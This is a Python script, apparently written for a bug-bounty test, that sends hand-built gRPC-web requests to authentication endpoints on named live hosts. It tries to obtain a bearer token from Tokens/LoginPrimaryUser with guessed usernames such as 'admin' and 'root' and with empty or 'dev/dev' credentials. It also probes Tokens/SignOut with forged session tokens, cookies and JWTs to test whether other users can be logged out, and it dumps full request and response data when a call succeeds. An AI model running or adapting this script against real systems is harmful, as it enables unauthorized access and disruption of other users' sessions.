#!/usr/bin/env python3
"""
PHASE 1 — Test 2: Tokens/LoginPrimaryUser (zero-credential probe)
PHASE 1 — Test 3: Tokens/SignOut (unauthenticated behavior)

Target hosts: catalog.anduril.com, sandboxes.developer.anduril.com

LoginPrimaryUser — probing an undocumented method that may issue a token for a
built-in sandbox service account without requiring credentials.

SignOut — grpc-status:0 was previously observed without auth. This test maps
what inputs change the response to understand if:
  a) any session/token identifier is honored (forced logout of others), or
  b) the endpoint is a no-op (returns success trivially — Broken Auth CWE-287)
"""
import struct, time, sys
import requests

requests.packages.urllib3.disable_warnings()

# ─── protobuf helpers ────────────────────────────────────────────────────────

def _vi(v):
    r = b""
    while True:
        b = v & 0x7F; v >>= 7
        r += bytes([b | 0x80]) if v else bytes([b])
        if not v: break
    return r

def proto_str(fn, s):
    v = s.encode(); return _vi((fn << 3) | 2) + _vi(len(v)) + v

def proto_bytes(fn, b):
    return _vi((fn << 3) | 2) + _vi(len(b)) + b

def proto_vi(fn, v):
    return _vi((fn << 3) | 0) + _vi(v)

def proto_msg(fn, inner):
    return _vi((fn << 3) | 2) + _vi(len(inner)) + inner

def grpc_frame(b):
    return b"\x00" + struct.pack(">I", len(b)) + b

def parse_grpc_response(r):
    status = r.headers.get("grpc-status", "?")
    msg = r.headers.get("grpc-message", "")
    try:
        import urllib.parse; msg = urllib.parse.unquote(msg)
    except Exception:
        pass
    data = b""
    raw = r.content; i = 0
    while i < len(raw):
        if i + 5 > len(raw): break
        ft = raw[i]; fl = struct.unpack(">I", raw[i+1:i+5])[0]
        fb = raw[i+5:i+5+fl]; i += 5 + fl
        if ft == 0x00:
            data = fb
        elif ft == 0x80:
            for line in fb.decode("utf-8", "replace").split("\r\n"):
                if line.startswith("grpc-status:"):
                    status = line.split(":", 1)[1].strip()
                elif line.startswith("grpc-message:"):
                    msg = line.split(":", 1)[1].strip()
                    try:
                        import urllib.parse; msg = urllib.parse.unquote(msg)
                    except Exception:
                        pass
    readable = "".join(chr(c) if 32 <= c < 127 else "." for c in data)
    return status, msg, data, readable

def grpc_call(host, svc, body, label, extra_headers=None, delay=0.4):
    S = requests.Session(); S.verify = False
    hdrs = {"content-type": "application/grpc-web+proto", "x-grpc-web": "1"}
    if extra_headers:
        hdrs.update(extra_headers)
    url = f"https://{host}/{svc}"
    try:
        r = S.post(url, data=grpc_frame(body), headers=hdrs, timeout=12)
        status, msg, data, readable = parse_grpc_response(r)
        flag = "  *** grpc-status=0 — CAPTURE AND STOP ***" if status == "0" else ""
        print(f"  [{label:55s}]  HTTP={r.status_code}  grpc={status}  {msg[:90]}{flag}")
        if data:
            print(f"    DATA({len(data)}B): {data.hex()[:80]}  |  {readable[:120]}")
        if status == "0":
            print()
            print("  === EVIDENCE DUMP ===")
            print(f"  URL: {url}")
            print(f"  Req body (hex): {grpc_frame(body).hex()}")
            print(f"  Resp headers: {dict(r.headers)}")
            print(f"  Resp body (hex): {r.content.hex()}")
            if data:
                print(f"  Payload (str): {readable}")
            print("  === END EVIDENCE ===")
            sys.stdout.flush()
        time.sleep(delay)
        return r.status_code, status, msg, data
    except Exception as e:
        print(f"  [{label:55s}]  ERROR: {e}")
        return None, None, str(e), b""

CATALOG = "catalog.anduril.com"
SANDBOX = "sandboxes.developer.anduril.com"

# ══════════════════════════════════════════════════════════════════════════════
# TEST 2: Tokens/LoginPrimaryUser — zero-credential token acquisition
# ══════════════════════════════════════════════════════════════════════════════
print("=" * 70)
print("  TEST 2: anduril.auth.v2.Tokens/LoginPrimaryUser")
print("=" * 70)
print()
print("  Strategy: Probe field layout variants on both hosts.")
print("  Signal A: grpc-status=0 + data payload → bearer token issued = CRITICAL")
print("  Signal B: error message reveals expected field format → iterate")
print("  Signal C: grpc-status=5 (NOT_FOUND) → method not deployed here")
print("  Signal D: grpc-status=12 (UNIMPLEMENTED) → exists but disabled")
print()

SVC_LPU = "anduril.auth.v2.Tokens/LoginPrimaryUser"

login_primary_payloads = [
    (b"", "empty — baseline"),
    # String field 1 variants (username / user_id / email)
    (proto_str(1, "admin"), "f1(str)='admin'"),
    (proto_str(1, "primary"), "f1(str)='primary'"),
    (proto_str(1, "root"), "f1(str)='root'"),
    (proto_str(1, "service"), "f1(str)='service'"),
    (proto_str(1, "system"), "f1(str)='system'"),
    (proto_str(1, "lattice"), "f1(str)='lattice'"),
    (proto_str(1, "admin@anduril.com"), "f1(str)='admin@anduril.com'"),
    (proto_str(1, "sandbox"), "f1(str)='sandbox'"),
    # Varint field 1 (enum type or user_id)
    (proto_vi(1, 0), "f1(int)=0"),
    (proto_vi(1, 1), "f1(int)=1"),
    (proto_vi(1, 2), "f1(int)=2"),
    # Two-field combinations (user + credential or type)
    (proto_str(1, "admin@anduril.com") + proto_vi(2, 1), "f1=email+f2(int)=1"),
    (proto_str(1, "admin@anduril.com") + proto_str(2, ""), "f1=email+f2(str)=''"),
    (proto_vi(1, 1) + proto_str(2, "admin"), "f1(int)=1+f2(str)='admin'"),
    # Sandbox-specific: may have a built-in primary user credential
    (proto_str(1, "sandbox-primary") + proto_str(2, ""), "sandbox-primary+empty_cred"),
    (proto_str(1, "dev") + proto_str(2, "dev"), "dev+dev"),
    # Null / zero variants  
    (proto_str(1, "\x00"), "f1=null_byte"),
    (proto_vi(1, 0) + proto_vi(2, 0), "f1=0+f2=0"),
]

for host, hlabel in [(CATALOG, "catalog"), (SANDBOX, "sandboxes")]:
    print(f"  ══ Host: {host} ══")
    for body, label in login_primary_payloads:
        grpc_call(host, SVC_LPU, body, f"{hlabel} | {label}")
    print()

# ══════════════════════════════════════════════════════════════════════════════
# TEST 3: Tokens/SignOut — unauthenticated behavior deep-dive
# ══════════════════════════════════════════════════════════════════════════════
print("=" * 70)
print("  TEST 3: anduril.auth.v2.Tokens/SignOut")
print("=" * 70)
print()
print("  Strategy: Determine if grpc-status:0 is a no-op or genuinely processes")
print("  session/token identifiers. Checking if any input produces a DIFFERENT")
print("  response — which would confirm the endpoint acts on caller-supplied data.")
print()
print("  Safety: NOT sending wildcard session terminators. Only probing")
print("  response variation — not attempting bulk session invalidation.")
print()

SVC_SIGNOUT = "anduril.auth.v2.Tokens/SignOut"

# Baseline: observe the grpc-status, message, and data for various inputs.
# We want to know: does ANY input produce a different status/message/data than empty?
signout_payloads = [
    (b"", None, "empty (baseline) — does this return grpc:0?"),
    # Field 1 variants (session token or session ID)
    (proto_str(1, "fake_session_token_aaaa"), None, "f1=fake_session_str"),
    (proto_str(1, "eyJhbGciOiJIUzI1NiJ9.e30.XXXX"), None, "f1=JWT_format_string"),
    (proto_vi(1, 0), None, "f1(int)=0"),
    (proto_vi(1, 1), None, "f1(int)=1"),
    # Field 2 variants (user identifier)
    (proto_str(2, "admin@anduril.com"), None, "f2=email"),
    (proto_str(1, "fake") + proto_str(2, "admin@anduril.com"), None, "f1=token+f2=email"),
    # Field 3 variants (scope / all-sessions flag)
    (proto_vi(3, 1), None, "f3(int)=1 (bool=true — all sessions?)"),
    (proto_vi(3, 0), None, "f3(int)=0 (bool=false)"),
    # Cookie-based — does it honor Cookie header?
    (b"", {"Cookie": "session=fake_session_cookie_value"}, "empty + Cookie header"),
    (b"", {"Cookie": "anduril_session=fake", "Authorization": "Bearer fake_token"}, "empty + Cookie + Auth header"),
    # Authorization header only
    (b"", {"Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.e30.XXXX"}, "empty + Bearer JWT"),
    # All-false / empty message variants
    (proto_str(1, ""), None, "f1=empty_str"),
    (proto_bytes(1, b"\x00"), None, "f1=null_bytes"),
]

print(f"  ══ Host: {CATALOG} ══")
baseline_status = None
baseline_msg = None
baseline_data = None

for body, extra_hdrs, label in signout_payloads:
    _, status, msg, data = grpc_call(
        CATALOG, SVC_SIGNOUT, body, label,
        extra_headers=extra_hdrs, delay=0.5
    )
    if baseline_status is None:
        baseline_status = status
        baseline_msg = msg
        baseline_data = data
    else:
        # Flag any deviation from baseline
        if status != baseline_status or msg != baseline_msg or data != baseline_data:
            print(f"    ^^^ RESPONSE DIFFERS FROM BASELINE (grpc:{baseline_status} '{baseline_msg[:40]}')")

print()
print(f"  ══ Host: {SANDBOX} ══")
baseline_status_s = None

for body, extra_hdrs, label in signout_payloads[:8]:  # Subset on sandbox
    _, status, msg, data = grpc_call(
        SANDBOX, SVC_SIGNOUT, body, f"sandboxes | {label}",
        extra_headers=extra_hdrs, delay=0.5
    )
    if baseline_status_s is None:
        baseline_status_s = status

print()
print("=" * 70)
print("  Tokens/SignOut analysis complete.")
print()
print("  If baseline grpc-status=0 (success without auth):")
print("    → Broken Authentication (CWE-287), reportable as MEDIUM-HIGH")
print("    → Report language: 'SignOut succeeds without any authentication token,")
print("      allowing an unauthenticated caller to invoke session management")
print("      endpoints. Even if the server is a no-op, this endpoint violates")
print("      the Broken Authentication definition — session management endpoints")
print("      must reject unauthenticated requests regardless of backend effect.'")
print()
print("  If any input changes the response:")
print("    → Endpoint processes caller-supplied identifiers without auth verification")
print("    → Escalated to HIGH: an attacker can force-signout targeted sessions")
print("    → Demonstrate: submit token of a second test account, verify that")
print("      account's session is invalidated.")
print()
print("=" * 70)
print("  PHASE 1 — TEST 2 + 3 COMPLETE")
print("=" * 70)
